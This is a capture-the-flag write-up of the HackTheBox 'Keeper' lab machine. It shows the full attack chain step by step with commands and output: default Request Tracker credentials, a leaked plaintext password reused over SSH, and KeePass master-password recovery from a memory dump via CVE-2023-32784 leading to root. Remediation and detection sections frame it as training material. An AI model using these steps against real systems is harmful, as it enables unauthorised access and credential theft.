# HackTheBox — Keeper

> **OS:** Linux (Ubuntu 22.04)  ·  **Difficulty:** Easy  ·  **Date:** 2026-08-15

**Kill chain:** `vhost → Request Tracker default creds → admin panel leaks user password → SSH → KeePass memory-dump (CVE-2023-32784) → root's PuTTY key → root`

---

## Overview

Keeper is a clean, breadcrumb-driven easy box with no exploitation drama — every step is an artifact the box hands you if you read carefully. A **Request Tracker** instance uses **default credentials**; the admin panel leaks a user's initial password in a comment field; that password is reused for SSH. Privilege escalation chains a **KeePass 2.x memory-dump vulnerability (CVE-2023-32784)** to recover the database master password, which unlocks an entry containing **root's PuTTY-format SSH private key**.

The theme runs through the whole box: it's called *Keeper*, and the payoff is a password manager. The lesson here is observational — the pre-filled username, the exact version string, the user's stated language, and the loot file names are all clues placed in plain sight.

---

## Recon

```bash
nmap -sC -sV -p- 10.129.229.41
```

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Port 80 serves a page pointing at a ticketing system. Add the hosts:

```bash
# /etc/hosts
10.129.229.41  keeper.htb tickets.keeper.htb
```

`tickets.keeper.htb` presents a **Request Tracker (RT)** login, version disclosed on the page: **RT 4.4.4+dfsg-2ubuntu1**, app served under `/rt`.

Two details in the login page source worth noting: the username field is pre-filled `value="admin"`, and the app is stock RT — both hint at default credentials.

---

## Foothold pt.1 — RT default credentials

RT ships with a well-known default administrator account, `root` / `password`. It works:

```
Logged in as root  →  full RT admin panel
```

As admin, enumerate the other users (Admin → Users). Alongside `root` (Enoch Root) there's a real human account:

```
lnorgaard   "Lise Nørgaard"   lnorgaard@keeper.htb   (Enabled)
```

Opening that user's admin page (Admin → Users → lnorgaard) reveals the payoff in the **Comments** field:

```
New user. Initial password set to Welcome2023!
```

The profile also lists **Unix login: lnorgaard** and **Language: Danish** — remember the language, it matters for privesc.

---

## Foothold pt.2 — SSH as lnorgaard

The RT password is reused for the system account:

```bash
ssh lnorgaard@10.129.229.41      # Welcome2023!
```

```
lnorgaard@keeper:~$ cat user.txt
0012aa4f…[REDACTED]
lnorgaard@keeper:~$ ls
KeePassDumpFull.dmp  passcodes.kdbx  RT30000.zip  user.txt
```

The home directory hands over the privesc thread directly: a **KeePass database** (`passcodes.kdbx`) and a **memory dump of the KeePass process** (`KeePassDumpFull.dmp`), bundled in `RT30000.zip`.

---

## Privilege Escalation — CVE-2023-32784 (KeePass master-key recovery)

The presence of a `.kdbx` plus a process `.dmp` is the signature setup for **CVE-2023-32784**: KeePass 2.x leaves recoverable fragments of the master password in process memory as the user types it. Every character except (usually) the first can be reconstructed from a dump.

Pull both files down and run a PoC against the dump:

```bash
scp lnorgaard@10.129.229.41:~/{KeePassDumpFull.dmp,passcodes.kdbx} .
python3 keepass_dump.py -f KeePassDumpFull.dmp
```

```
[*] Extracted: ●dgrd med flde
```

The first character is missing and the special characters render as gaps — but the fragment `dgrd med flde` plus lnorgaard's **Danish** language field resolves it to a well-known Danish dessert / tongue-twister:

```
rødgrød med fløde
```

Unlock the database with that master password and enumerate entries:

```bash
keepassxc-cli open passcodes.kdbx      # rødgrød med fløde
passcodes.kdbx> ls Network/
keeper.htb (Ticketing Server)
Ticketing System
```

The `keeper.htb (Ticketing Server)` entry's **notes** field holds root's SSH key in **PuTTY format** (`PuTTY-User-Key-File-3`). Read it with the attribute flag (the parentheses/space in the name break positional parsing):

```bash
keepassxc-cli show -s -a Notes passcodes.kdbx "Network/keeper.htb (Ticketing Server)"
```

Save the full `PuTTY-User-Key-File-3: … Private-MAC:` block as `root.ppk`, convert to OpenSSH, and log in:

```bash
puttygen root.ppk -O private-openssh -o id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@10.129.229.41
```

```
root@keeper:~# cat /root/root.txt
d5f85609…[REDACTED]
```

> **Gotcha:** the key is PuTTY **v3** format — older `puttygen` only reads v2 and errors with "key format too new." Update `putty-tools` (current Kali handles v3). And use lowercase `ssh -i` (identity), not `-I` (PKCS11 library) — the latter throws a confusing `C_GetFunctionList` error and falls back to a password prompt.

---

## Remediation

| Finding | Severity | Fix |
|---------|----------|-----|
| Request Tracker default credentials (`root:password`) | **Critical** | Change default admin credentials on install; enforce a first-login password reset. |
| Initial password stored in plaintext in RT user comment | High | Never record passwords in ticket/user free-text fields; force reset of admin-set initial passwords. |
| Password reuse (RT ↔ system account) | High | Distinct credentials per service; the same secret should never span an app and a shell login. |
| KeePass 2.x vulnerable to CVE-2023-32784 | High | Update KeePass to ≥ 2.54; do not leave process memory dumps on disk. |
| Sensitive dump/DB left in a user's home | Medium | Handle credential-material and crash dumps as secrets; store off-host, encrypted, and purge. |

---

## Detection notes (blue-team view)

- **RT default-cred login is auth-log visible.** A successful RT admin authentication as `root` from an external IP, with no prior failed-then-changed pattern, is worth flagging — default-account usage is a high-value alert in any app that supports it.
- **The KeePass CVE has host artifacts, not network ones.** The tell is a **KeePass process crash/memory dump** (`.dmp`) being created, and later that dump plus the `.kdbx` being **read/copied by a non-owner or exfiltrated** (here, `scp` off-host). File-integrity/EDR watching for process memory dumps of credential apps, and for `.kdbx`/`.dmp` egress, catches this.
- **Credential reuse is correlatable.** RT web-app login and the subsequent SSH login for `lnorgaard` share a source IP within a short window — joining web and auth logs by source surfaces the reuse pivot.
- **Root login via key from an unusual source IP** is the final signal — a `root` SSH session keyed (not password) from a new external address, right after credential-store access, is the compromise made visible.

---

## Lessons

- **Read everything the box discloses.** Pre-filled `admin`, the exact RT version, the Danish language field (which supplied the missing master-password character), and the loot file names were all clues in plain sight. Careful observation, not exploitation skill, solved this box.
- **Default credentials remain a top real-world finding.** The whole chain starts because a production-shaped app shipped with `root:password` unchanged.
- **`.kdbx` + `.dmp` = CVE-2023-32784.** Recognising the file-pair signature is faster than trying to brute-force the database with `keepass2john`.
- **Secrets don't belong in free-text or on disk.** A password in a comment field and a credential store left in a home directory are the two human mistakes this box is built around.
